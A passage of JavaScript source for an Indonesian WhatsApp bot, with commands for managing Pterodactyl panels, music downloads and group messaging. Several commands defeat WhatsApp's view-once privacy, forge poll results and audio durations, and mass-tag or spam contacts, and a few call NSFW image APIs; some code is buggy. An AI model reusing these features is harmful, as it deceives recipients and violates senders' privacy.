    if (!args[0]) return m.reply(`*Format salah*\nPenggunaan: ${prefix}stopalladmin <ID>,<server>`);

    // Ambil argumen ID yang dikecualikan dan server
    const [excludedAdminId, serverChoice] = args[0].split(',');

    if (!excludedAdminId || !serverChoice) {
        return m.reply(`Format salah! Gunakan format:\n${prefix}stopalladmin <ID>,<server>`);
    }

    // Validasi serverChoice
    let serverConfig;
    if (["1", "satu"].includes(serverChoice)) {
        serverConfig = { domain: global.domain, apikey: global.apikey };
    } else if (["2", "dua"].includes(serverChoice)) {
        serverConfig = { domain: global.domain2, apikey: global.apikey2 };
    } else if (["3", "prib"].includes(serverChoice)) {
        serverConfig = { domain: global.domain3, apikey: global.apikey3 };
    } else {
        return m.reply(`Server tidak valid. Gunakan '1', '2', atau '3'.`);
    }

    const { domain, apikey } = serverConfig;

    reply(`Proses penghentian hak admin dimulai untuk server ${serverChoice}, kecuali ID ${excludedAdminId}.`);

    // Fungsi untuk menghentikan hak admin
    async function stopAllAdmins() {
        let currentPage = 1;
        let totalPages;

        do {
            // Ambil data pengguna di server tertentu
            let response = await fetch(`${domain}/api/application/users?page=${currentPage}`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${apikey}`
                }
            });

            if (!response.ok) {
                reply(`Gagal mendapatkan data pengguna: ${response.statusText}`);
                return;
            }

            let result = await response.json();

            // Pastikan pagination tersedia
            if (result.meta && result.meta.pagination) {
                totalPages = result.meta.pagination.total_pages;
            } else {
                reply(`Gagal mendapatkan data pagination.`);
                return;
            }

            // Iterasi setiap pengguna
            for (let user of result.data) {
                let userId = user.attributes.id;
                let username = user.attributes.username;
                let email = user.attributes.email;
                let firstName = user.attributes.first_name;
                let lastName = user.attributes.last_name;
                let isAdmin = user.attributes.root_admin;

                // Lewati jika ID sama dengan yang dikecualikan
                if (userId === Number(excludedAdminId)) {
                    console.log(`Melewatkan admin dengan ID ${userId}`);
                    reply(`Melewatkan admin dengan ID ${excludedAdminId}`);
                    continue;
                }

                if (!isAdmin) continue; // Lewati jika bukan admin

                // Lakukan PATCH untuk menghentikan hak admin
                let updateAdmin = await fetch(`${domain}/api/application/users/${userId}`, {
                    method: 'PATCH',
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${apikey}`
                    },
                    body: JSON.stringify({
                        username: username || "",
                        email: email || "",
                        first_name: firstName || "",
                        last_name: lastName || "",
                        root_admin: false
                    })
                });

                if (updateAdmin.ok) {
                    console.log(`Berhasil menghentikan hak admin: ${username}`);
                    reply(`Berhasil menghentikan hak admin: *${username}*`);
                } else {
                    let errorResult = await updateAdmin.json();
                    let errorDetails = errorResult.errors
                        ? errorResult.errors.map(err => `${err.detail}`).join(", ")
                        : "Terjadi kesalahan yang tidak diketahui.";
                    console.log(`Gagal menghentikan hak admin ${username}: ${errorDetails}`);
                    reply(`Gagal menghentikan hak admin *${username}*: ${errorDetails}`);
                }
            }

            currentPage++;
        } while (currentPage <= totalPages);
    }

    // Jalankan proses
    await stopAllAdmins();
    reply(`Proses penghentian semua hak admin selesai untuk server ${serverChoice}.`);
}
break
case 'tes':{
const buttons = [
          { index: 1, urlButton: { displayText: "Sini", url: "https://firebasestorage.googleapis.com/v0/b/temp-file-share.appspot.com/o/TmpMilaAIT.1733910123136.jpg?alt=media&token=0b89eadc-9431-4821-8814-eb8a4ea1d490" } },
          { index: 2, quickReplyButton: { displayText: "hm", id: "okk" } },
          { index: 3, quickReplyButton: { displayText: "mm", id: "m" } },
          { index: 4, quickReplyButton: { displayText: "om", id: "ok" } },
        ];

const buttonsMessage = {
   text: "ok",
  contentText: "kalau ini mah jangan tanya lagi", 
  footer: "𝐋𝐨𝐫𝐞𝐧𝐳𝐨͢ 𝐓𝐞𝐜𝐡 // 𝐒𝐡𝐚𝐫𝐞 𝐀𝐛𝐨𝐮𝐭 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐨𝐭.", 
  viewOnce: true, 
  title: "okkk",
  templateButtons: buttons,
  headerType: 2
}

return await Izz.sendMessage(m.chat, buttonsMessage)
}
break
case 'menu': {
loading()
const owned = `${owner}@s.whatsapp.net`
const text13 = `*Berikut adalah fitur sc IzzWangsap* @${sender.split("@")[0]} 

~ sᴛᴀᴛᴜs ~
ᴘɪɴɢ = 
ᴏᴡɴᴇʀ ᴜsᴇʀ = ɪᴢᴢ
ɴᴏᴍᴏʀ ᴏᴡɴᴇʀ = 6281274749995
ʙᴜʏ sᴄ = 6281274749995
${readmore}
~ ғᴜɴᴄᴛɪᴏɴ ~

*_Menu Cpanel Izz_*
•1ɢʙ <ɴᴀᴍᴇ>
•2ɢʙ <ɴᴀᴍᴇ>
•3ɢʙ <ɴᴀᴍᴇ>
•4ɢʙ <ɴᴀᴍᴇ>
•5ɢʙ <ɴᴀᴍᴇ>
•6ɢʙ <ɴᴀᴍᴇ>
•7ɢʙ <ɴᴀᴍᴇ>
•ᴜɴʟɪ <ɴᴀᴍᴇ>
•ᴄᴀᴅᴍɪɴ <ɴᴀᴍᴇ>
•ᴄʟᴇᴀʀᴘᴀɴᴇʟ <ɪᴅ>
•ᴄʟᴇᴀʀᴜsᴇʀ <ɪᴅ>
•ᴅᴇʟᴜsʀ <ɪᴅ>
•ʟɪsᴛsʀᴠ 
•ʟɪsᴛᴜsʀ
•ʟɪsᴛᴀᴅᴍɪɴ
•ᴅᴇʟᴘᴀɴᴇʟ <ɪᴅ>

*_Owner Fitur_*
•ᴀᴜᴛᴏᴘʀᴏᴍᴏsɪ
•ᴀᴅᴅᴀᴋsᴇs
•ᴀᴅᴅᴘʀᴇᴍ
•ᴅᴇʟᴀᴋsᴇs
•ᴀᴅᴅᴏᴡɴᴇʀ
•ᴅᴇʟᴏᴡɴᴇʀ
•ʀᴇsᴇᴛᴀsɪsᴛᴇɴ
•ʀᴇsᴇᴛᴏᴡɴᴇʀ
•ᴀᴅᴅᴘʀᴇᴍ
•ᴅᴇʟᴘʀᴇᴍ 
•ᴄʀᴇᴀᴛᴇɢᴄ
•ᴛᴀɢsᴡ
•ᴇᴠᴇʀʏᴏɴᴇ
•ғᴀᴋᴇᴠᴏᴛᴇ
•ʜᴇɴᴛᴀɪ

*_Menu Pushkontak and Jpm Simple_*
•ᴘᴜsʜᴋᴏɴᴛᴀᴋ
•ᴘᴜsʜᴋᴏɴᴛᴀᴋ2
•ʟɪsᴛɢᴄ
•ᴊᴘᴍ
•ᴊᴘᴍ2

*_Menu Group Simple_*
•ᴋɪᴄᴋ
•ᴀᴅᴅ
•ᴇᴅɪᴛɪɴғᴏ
•ʜɪᴅᴇᴛᴀɢ
•ᴇᴅɪᴛᴅᴇᴋs
•ᴅᴇᴍᴏᴛᴇ
•ᴘʀᴏᴍᴏᴛᴇ
•ɢᴄ
•ᴅᴇʟᴇᴛᴇ/ᴅᴇʟ
•ᴛᴀɢᴀʟʟ

*_Convert Menu Simple_*
•ᴛᴏᴍᴘ3
•ᴛᴏᴜʀʟ
•ᴛᴏɪᴍᴀɢᴇ
•sᴛɪᴋᴇʀ
•ssᴡᴇʙ

*_Downloader Menu Simple_*
capcut
•ᴍᴇᴅɪᴀғɪʀᴇ
•ᴛᴛ

*_Search Menu Simple_*
•ᴘɪɴᴠɪᴅᴇᴏ
•ᴘʟᴀʏ
•sᴏᴜɴᴅ
•ᴘɪɴ

*_Fun Menu Simple_*
•ᴄᴇᴋᴋᴏᴅᴀᴍ
•ᴄᴇᴋɢᴀɴᴛᴇɴɢ
•ᴄᴇᴋᴄᴀɴᴛɪᴋ
•ᴄᴇᴋɢᴀʏ
•ᴄᴇᴋʟᴇsʙɪ
•ʙɪsᴀᴋᴀʜ

*_Menu Bot Simple_*
•sᴇᴛʙɪᴏʙᴏᴛ
•sᴇᴛɴᴀᴍᴀʙᴏᴛ
•ʙᴀᴄᴋᴜᴘ

*_Ai Menu Simple_*
•ᴀɪ
•ᴄʜᴀᴛʙᴏᴛ

#ғʀᴇᴇ ᴘᴀʟᴇsᴛɪɴᴇ 🇵🇸
`
Izz.sendMessage(from, { image: thumb,  caption: text13, mentions:[sender, owned] }, { quoted:m})

const audioPath = './lagu.mp3';
    if (fs.existsSync(audioPath)) {
        Izz.sendMessage(m.chat, {
            audio: fs.readFileSync(audioPath),
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: qchanel });
    } else {
        reply("Audio `kece.mp3` tidak ditemukan.");
    }
    }
    break
    case 'puki': {
    // send old a buttons
Izz.sendMessage(m.chat, {
     text: "Hello World !",
     footer: "Fizzxy - 2025",
     buttons: [ 
         { buttonId: `🚀`,
          buttonText: {
              displayText: '🗿'
          }, type: 1 }
     ],
     headerType: 1,
     viewOnce: true
 },{ quoted: null })
 }
     break;
   
case 'idch': case 'cekidch': {
if (!text) return reply(example("linkchnya mana"))
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Izz.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: wm }, 
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : m });
await Izz.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
case'fvote': 
case 'fakevote': 
case 'votef': 
case 'votefake': {
if (!isOwner && !isBot) return (mess.owner);
if (!text) return reply(`Contoh : ${prefix+command} judul,teks,100,teks2,500`)
const [title, tek1 ,vot1, tek2, vot2] = text.split(",")
Izz.relayMessage(m.chat, {
    "pollResultSnapshotMessage": {
        "name": title,
        "pollVotes": [{
            "optionName": tek1,
            "optionVoteCount": vot1
        }, 
        {
            "optionName": tek2,
            "optionVoteCount": vot2
        }
      ],
    }
}, {quoted: m})
}
break
case 'everyone': {
    // Pastikan hanya di grup
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply(` *FORMAT SALAH*\nSILAHKAN LAKUKAN DENGAN CONTOH\n*${prefix + command}* HALO`);
    if (!m.isGroup) return reply("Perintah ini hanya dapat digunakan di grup!");
const stat = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": "","fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./all/Menu.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
    try {
        // Anda bisa menyesuaikan teks
        await Izz.sendMessage(m.chat, {
text: `@${m.chat} ${text}`,
contextInfo: {
mentionedJid: participants.map(a => a.id),
groupMentions: [
   {
groupSubject: `Everyone`,
groupJid: m.chat,
 }, ], },},{quoted:m});
    } catch (err) {
        console.error("Error fmention:", err);
        reply("❌ Terjadi kesalahan saat mengirim fake mention group.");
    }
}
break
case 'self': {
if (!isOwner) return m.reply(mess.owner);
Izz.public = false
m.reply('Sukses mengubah ke mode self')
}
break
case 'public': {
if (!isOwner) return m.reply(mess.owner);
Izz.public = true
m.reply('Sukses mengubah ke mode true')
}
break
case 'tagsw': {
    // Validasi role
    if (!isOwner && !isBot) return m.reply("Perintah ini hanya untuk Owner atau Bot itu sendiri.");

    // Format input: <caption>,<id_grup>
    // Jika id_grup tidak disertakan, gunakan grup tempat perintah dikirim
    if (!text) return m.reply("Format salah!\nContoh: .tagsw Ini caption, 120363025090404508@g.us");

    let [cap, idgc] = text.split(',');
    cap = cap ? cap.trim() : "";
    idgc = idgc ? idgc.trim() : m.chat;

    let media = null;
    let options = {};
    const jids = [m.sender, m.chat];

    if (quoted) {
        const mime = quoted.mtype || quoted.mediaType || "";

        // Jika reply media
        if (mime.includes('image')) {
            media = await m.quoted.download();
            options = {
                image: media,
                caption: cap || m.quoted.text || '',
            };
        } else if (mime.includes('video')) {
            media = await m.quoted.download();
            options = {
                video: media,
                caption: cap || m.quoted.text || '',
            };
        } else if (mime.includes('audio')) {
            media = await m.quoted.download();
            options = {
                audio: media,
                mimetype: 'audio/mp4',
                ptt: true, // Ubah ke true jika ingin jadi voice note
            };
        } else {
            // Jika bukan image/video/audio, kirim teks
            options = {
                text: cap || m.quoted.text || '',
            };
        }
    } else {
        // Jika tidak reply media, hanya teks
        options = {
            text: cap,
        };
    }

    try {
        // Ambil daftar member grup
        const groupMeta = await Izz.groupMetadata(idgc);
        const participants = groupMeta.participants.map(a => a.id);

        // Kirim ke status@broadcast dengan mention semua member
        return Izz.sendMessage("status@broadcast", options, {
            backgroundColor: "#7ACAA7",
            textArgb: 0xffffffff,
            font: 1,
            statusJidList: participants,
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: jids.map(() => ({
                                tag: "to",
                                attrs: { jid: idgc },
                                content: undefined,
                            })),
                        },
                    ],
                },
            ],
        });
    } catch (err) {
        console.error("Error tagsw:", err);
        return m.reply("❌ Terjadi kesalahan saat mengirim status.");
    }
}
break
case 'upstatus': {
    // Pastikan user memberikan teks atau mereply media
    if (!isOwner && !isBot) return m.reply(mess.owner);
    if (!text) return reply("Format salah!\nContoh:\n1) Balas gambar/video/audio dengan .upstatus <caption>\n2) .upstatus <teks status>");

    // Siapkan content yang akan diunggah ke status
    let options = {};
    let media = null;

    // Jika user me-reply media
     if (quoted) {
        const mime = quoted.mtype || quoted.mediaType || "";

        // Jika reply media
        if (mime.includes('image')) {
            media = await m.quoted.download();
            options = {
                image: media,
                caption: cap || m.quoted.text || '',
            };
        } else if (mime.includes('video')) {
            media = await m.quoted.download();
            options = {
                video: media,
                caption: cap || m.quoted.text || '',
            };
        } else if (mime.includes('audio')) {
            media = await m.quoted.download();
            options = {
                audio: media,
                mimetype: 'audio/mp4',
                ptt: true, // Ubah ke true jika ingin jadi voice note
            };
        } else {
            // Jika bukan image/video/audio, kirim teks
            options = {
                text: cap || m.quoted.text || '',
            };
        }
    } else {
        // Jika tidak reply media, hanya teks
        options = {
            text: cap,
        };
    }


    try {
        // Mengirim ke status@broadcast
        await Izz.sendMessage("status@broadcast", options, {
            backgroundColor: "#7ACAA7", // warna latar (opsional)
            textArgb: 0xffffffff,       // warna teks (ARGB), misalnya putih
            font: 1,                     // tipe font (opsional)
        });
        reply("✅ Status berhasil diunggah!");
    } catch (err) {
        console.error("Error upstatus:", err);
        reply("❌ Terjadi kesalahan saat mengunggah status.");
    }
}
break

case 'hentai': {
if (!isOwner && !isBot) return m.reply(`Khusus Owner Bre`);
    await reply(`tunggu sebentar`);
    let res = await fetch(`https://waifu.pics/api/nsfw/waifu`);
    let json = await res.json();
    let sentMsg = await Izz.sendMessage(from, { image: { url: json.url }}, { quoted: m });
      }
      break;

case 'upsw': {
    if (!isOwner) return m.reply("Perintah ini hanya untuk Owner.");

    // Jika user tidak memberikan teks dan tidak reply media
    if (!text) {
        return m.reply(`Contoh penggunaan:
1) Balas media (gambar/video/audio) dengan .upsw <caption>
2) .upsw <teks status>`);
    }

    let media = null;
    let options = {};

    // Jika user me-reply media
    if (quoted) {
        const mime = quoted.mtype || quoted.mediaType || "";
        // Unduh media

        if (mime.includes('image')) {
            options = {
                image: media,
                caption: text || quoted.text || ''
            };
        } else if (mime.includes('video')) {
            options = {
                video: media,
                caption: text || quoted.text || ''
            };
        } else if (mime.includes('audio')) {
            options = {
                audio: media,
                mimetype: 'audio/mp4',
                ptt: true, // ubah true jika ingin voice note
            };
        } else {
            // Jika bukan image/video/audio, fallback teks
            options = {
                text: text || quoted.text || ''
            };
        }
    } else {
        // Jika tidak reply media, hanya teks
        options = {
            text
        };
    }

    try {
        // Kirim ke status@broadcast
        await Izz.sendMessage(
            "status@broadcast",
            options,
            {
                backgroundColor: "#7ACAA7", // Warna latar (opsional)
                textArgb: 0xffffffff,       // Warna teks (ARGB), misal putih
                font: 1                     // Tipe font (opsional)
            }
        );
        m.reply("✅ Status berhasil diunggah tanpa mention!");
    } catch (err) {
        console.error("Error upsw:", err);
        m.reply("❌ Terjadi kesalahan saat mengirim status.");
    }
}
break
case 'readvo': 
case "rvo": case "readviewonce": {
if (!isOwner) return 
if (!m.quoted) return m.reply("dengan reply pesannya")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Izz.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Izz.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Izz.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
case 'capcut': {
if (!isOwner) return 
if (!text) return m.reply(`\n\n *Format Salah*\nContoh : *${prefix + command} Link Video Capcut Nya*`)
m.reply('Proses 🗿')
await fetch(`https://api.diioffc.web.id/api/download/capcut?url=${text}`).then(async (res) => {
let response = await res.json()
Izz.sendMessage(m.chat, { video: { url: response.result.url }, mimetype: 'video/mp4', caption: response.result.title }, { quoted: m })
}).catch(err => m.reply('Error 🗿'))
}
break
 case 'nsfw': {
 if (!isOwner) return 
     reply(mess.wait);
    try {
        let res = await fetch(`https://api.lolhuman.xyz/api/random2/anal?apikey=${apimu}`, {
            method: 'GET',
            headers: {
                'Accept': 'application/json'
            }
        });
        let text = await res.text(); 
        let json;
        try {
            json = JSON.parse(text);
        } catch (parseError) {
            throw new Error("Gagal parsing JSON. API mungkin mengembalikan error atau format tidak sesuai.");
        }
        if (!json.url) throw new Error("URL tidak ditemukan dalam respons API.");
        await Izz.sendMessage(from, { video: { url: json.url } }, { quoted: m });
    } catch (error) {
        console.error("Error:", error);
        reply("Terjadi kesalahan saat mengambil data. Coba lagi nanti.");
    }
}
break
case 'ambilsw':{
if (!isOwner) return 
    if (isGroup) return reply("❌ Command ini hanya bisa digunakan di chat pribadi!");

    const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMessage) return reply("📌 Balas pesan gambar/video yang ingin diambil!");

    if (quotedMessage.imageMessage) {
        let imageUrl = await Izz.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        return Izz.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
    }

    if (quotedMessage.videoMessage) {
        let videoUrl = await Izz.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        return Izz.sendMessage(m.chat, { video: { url: videoUrl } }, { quoted: m });
    }

    return reply("❌ Hanya bisa mengambil gambar atau video dari pesan yang dikutip!");
}
break
case 'pinvid': case 'pinterestvideo': case 'pinvideo': {
if (!isOwner) return 
    if (!text) return reply('Masukkan kata kunci untuk mencari video di Pinterest!');
    async function PinterestVid(teks) {
        const url = `https://id.pinterest.com/resource/BaseSearchResource/get/?_=1619980301559&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${encodeURIComponent(teks)}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&source_url=%2Fsearch%2Fpins%2F%3Fq%3D${encodeURIComponent(teks)}`;
        try {
            const response = await axios.get(url);
            const data = response.data;
            if (!data || !data.resource_response || !data.resource_response.data || !data.resource_response.data.results) {
                return []; // Return an empty array if the structure is not as expected
            }
            const results = data.resource_response.data.results;
            const videoUrls = results
                .filter(pin => pin.story_pin_data) // Ensure story_pin_data exists
                .flatMap(pin => {
                    const pages = pin.story_pin_data.pages;
                    if (pages && pages.length > 0) {
                        const blocks = pages[0].blocks;
                        if (blocks && blocks.length > 0) {
                            const videoList = blocks[0].video && blocks[0].video.video_list;
                            if (videoList) {
                                return Object.values(videoList)
                                    .map(video => video.url)
                                    .filter(url => url); // Filter out empty URLs
                            }
                        }
                    }
                    return [];
                });
            return videoUrls;
        } catch (error) {
            return { error: error.message };
        }
    }

    const result = await PinterestVid(text);
    if (result.error) {
        reply(`Terjadi kesalahan: ${result.error}`);
    } else if (result.length === 0) {
        reply('Tidak ditemukan');
    } else {
        reply(`Hasil nya nih puqimak:\n\n${result.join('\n')}`);
    }}
break
case 'sps':
case 'spotifys':
case 'spotifysearch': {
if (!isOwner) return 
if (!text) return m.reply(`${prefix + command} untuk mencintaimu`)
m.reply('Proses 🗿')
await fetch(`https://api.diioffc.web.id/api/search/spotify?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 Hasil Pencarian SPOTIFY*\n\n'
for (let i of response.result) {
teks += `*◦ Judul :* ${i.trackName}\n`
teks += `*◦ Artis :* ${i.artistName}\n`
teks += `*◦ Link Url :* ${i.externalUrl}\n\n`
}
m.reply(teks)
}).catch(err => m.reply('Error 🗿'))
}
break;
    case 'tomp3': {
    if (!isOwner) return 
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`video nya mana ?`);
 reply(`Tunggu sebentar`);
    let media = await Izz.downloadMediaMessage(qmsg)
    let { toAudio } = require('./all/converter')
    let audio = await toAudio(media, 'mp4')
    Izz.sendMessage(m.chat, {
        document: audio,
        mimetype: 'audio/mp3',
        fileName: `${m.pushName}.mp3`
       }, { quoted: qchanel }) }
       break
       case 'upch-audio': {
    if (!isOwner) return m.reply("Perintah ini hanya untuk Owner.");
    // Pastikan user me-reply pesan audio & memberikan teks format: <channelId>,<fakeDuration>
    if (!quoted) return m.reply("Balas pesan audio dengan perintah .upch-audio <channelId>,<fakeDuration>");
    if (!text.includes(',')) return m.reply("Format salah!\nContoh: .upch-audio 120363025090404508@newsletter,180");

    let [chanInput, fakeSecStr] = text.split(',');
    let channelId = chanInput.trim(); // misalnya "120363025090404508@newsletter"
    let fakeSec = parseInt(fakeSecStr.trim());
    if (isNaN(fakeSec)) {
        return m.reply("Durasi tidak valid. Masukkan angka detik, misalnya 180.");
    }

    // Pastikan reply ke audio
    const mime = quoted.mtype || quoted.mediaType || "";
    if (!mime.includes('audio')) {
        return m.reply("Pesan yang dibalas bukan audio. Harap balas pesan audio!");
    }

    // Unduh media audio
    let media = await quoted.download();
    if (!media) return m.reply("Gagal mengunduh audio.");

    try {
        // Kirim audio ke channel
        // Menyetel seconds = fakeSec agar durasi terlihat sesuai keinginan
        await Izz.sendMessage(
            channelId,
            {
                audio: media,
                mimetype: 'audio/mp4',  // atau 'audio/mpeg'
                ptt: true,             // true jika ingin voice note
                seconds: fakeSec,       // durasi palsu
            },
            { quoted: m }
        );
        m.reply(`✅ Sukses mengirim Audio Ke Channel Dengan Durasi ${fakeSec}`);
    } catch (err) {
        console.error("Error upch-audio:", err);
        m.reply("❌ Terjadi kesalahan saat mengunggah audio ke channel.");
    }
}
break
case "searchspotify":
case "carilagu":
case "ssp": {
if (!isOwner) return
  if (!text) return m.reply(`Example: ${prefix + command} judul lagu`);
  
  try {
    let api = await fetch(`https://fastrestapis.fasturl.cloud/music/spotify?name=${text}`);
    let data = await api.json();
    
    if (data.status !== 200) return m.reply('Search failed! Try again later.');
    
    let hasil = `乂 *HASIL PENCARIAN SPOTIFY* ◦\n\n`;
    for (let i = 0; i < Math.min(10, data.result.length); i++) {
      let lagu = data.result[i];
      hasil += `乂 *${i + 1}.* ${lagu.title}\n`;
      hasil += `乂 *Artis* : ${lagu.artist}\n`;
      hasil += `乂 *Durasi* : ${lagu.duration}\n`;
      hasil += `乂 *URL* : ${lagu.url}\n\n`;
    }
    hasil += `Ketik ${prefix}spdown <url> untuk download music Spotify!`;
    
    await Izz.sendMessage(m.chat, { text: hasil });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break

case "spdown":
case "spotifydown":
case "downspotify": {
if (!isOwner) return 
  if (!text) return m.reply(`Example: ${prefix + command} url`);
  
  m.reply('Tunggu sebentar kak...');
  
  try {
    let api = await fetch(`https://fastrestapis.fasturl.cloud/downup/spotifydown?url=${text}`);
    let data = await api.json();
    
    if (data.status !== 200) return m.reply('Download failed! Try again later.');
    
    let caption = `乂 *SPOTIFY DOWNLOADER* ◦\n\n`;
    caption += `乂 *Title* : ${data.result.metadata.title}\n`;
    caption += `乂 *Artists* : ${data.result.metadata.artists}\n`;
    caption += `乂 *Album* : ${data.result.metadata.album}\n`;
    caption += `乂 *Release Date* : ${data.result.metadata.releaseDate}\n`;
    caption += `乂 *Link Dowload* : ${data.result.link}\n`;
    
    await Izz.sendMessage(m.chat, { image: { url: data.result.metadata.cover }, caption: caption });
    await Izz.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: "audio/mpeg" });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while downloading!');
  }
}
break
case "fertilisasi": {
if (!isOwner) return 
  if (!text) return m.reply(`Example: ${prefix + command} judul lagu`);
  
  try {
    let api = await fetch(`https://fastrestapis.fasturl.cloud/music/spotify?name=${text}`);
    let data = await api.json();
    
    if (data.status !== 200) return m.reply('Search failed! Try again later.');
    
    let hasil = `乂 *HASIL PENCARIAN SPOTIFY* ◦\n\n`;
    for (let i = 0; i < Math.min(1, data.result.length); i++) {
      let lagu = data.result[i];
      hasil += `乂 *${i + 1}.* ${lagu.title}\n`;
      hasil += `乂 *Artis* : ${lagu.artist}\n`;
      hasil += `乂 *Durasi* : ${lagu.duration}\n`;
      hasil += `乂 *URL* : ${lagu.url}\n\n`;
    }
    hasil += `Ketik ${prefix}spdown <url> untuk download music Spotify!`;
    
    await Izz.sendMessage(m.chat, { text: hasil });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
  m.reply('Tunggu sebentar kak...');
  
  try {
    let api2 = await fetch(`https://fastrestapis.fasturl.cloud/downup/spotifydown?url=${lagu.url}`);
    let data2 = await api2.json();
    
    if (data2.status !== 200) return m.reply('Download failed! Try again later.');
    
    let caption = `乂 *SPOTIFY DOWNLOADER* ◦\n\n`;
    caption += `乂 *Title* : ${data2.result.metadata.title}\n`;
    caption += `乂 *Artists* : ${data2.result.metadata.artists}\n`;
    caption += `乂 *Album* : ${data2.result.metadata.album}\n`;
    caption += `乂 *Release Date* : ${data2.result.metadata.releaseDate}\n`;
    caption += `乂 *Link Dowload* : ${data2.result.link}\n`;
    
    await Izz.sendMessage(m.chat, { image: { url: data2.result.metadata.cover }, caption: caption });
    await Izz.sendMessage(m.chat, { audio: { url: data2.result.link }, mimetype: "audio/mpeg" });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while downloading!');
  }
}
break
case "spotify": {
if (!isOwner) return
  if (!text) return m.reply(`Example: ${prefix + command} judul lagu`);

  try {
    m.reply("🔍 Mencari lagu di Spotify...");
    let api = await fetch(`https://fastrestapis.fasturl.cloud/music/spotify?name=${text}`);
    let data = await api.json();

    if (data.status !== 200 || !data.result.length) return m.reply('❌ Pencarian gagal atau lagu tidak ditemukan.');

    let lagu = data.result[0]; // Ambil lagu pertama dari hasil pencarian
    let hasil = `乂 *HASIL PENCARIAN SPOTIFY* ◦\n\n`;
    hasil += `🎵 *Judul* : ${lagu.title}\n`;
    hasil += `🎤 *Artis* : ${lagu.artist}\n`;
    hasil += `⏳ *Durasi* : ${lagu.duration}\n`;
    hasil += `🔗 *URL* : ${lagu.url}\n\n`;
    hasil += `⏳ Sedang mendownload lagu...`;

    // Kirim hasil pencarian terlebih dahulu
    await Izz.sendMessage(m.chat, { text: hasil });

    // Unduh lagu berdasarkan URL dari hasil pencarian
    let downloadApi = await fetch(`https://fastrestapis.fasturl.cloud/downup/spotifydown?url=${lagu.url}`);
    let downloadData = await downloadApi.json();

    if (downloadData.status !== 200) return m.reply('❌ Gagal mendownload lagu.');

    let caption = `🎶 *SPOTIFY DOWNLOAD*\n\n`;
    caption += `🎵 *Title* : ${downloadData.result.metadata.title}\n`;
    caption += `🎤 *Artists* : ${downloadData.result.metadata.artists}\n`;
    caption += `📀 *Album* : ${downloadData.result.metadata.album}\n`;
    caption += `📅 *Release Date* : ${downloadData.result.metadata.releaseDate}\n`;

    // Kirim cover lagu
    await Izz.sendMessage(m.chat, { image: { url: downloadData.result.metadata.cover }, caption: caption });

    // Kirim file audio
    await Izz.sendMessage(m.chat, { audio: { url: downloadData.result.link }, mimetype: "audio/mpeg" });

  } catch (e) {
    console.log(e);
    m.reply('❌ Terjadi kesalahan dalam proses pencarian atau download.');
  }
}
break
case 'nhentaisearch': {
if (!isOwner) return m.reply(mess.owner);
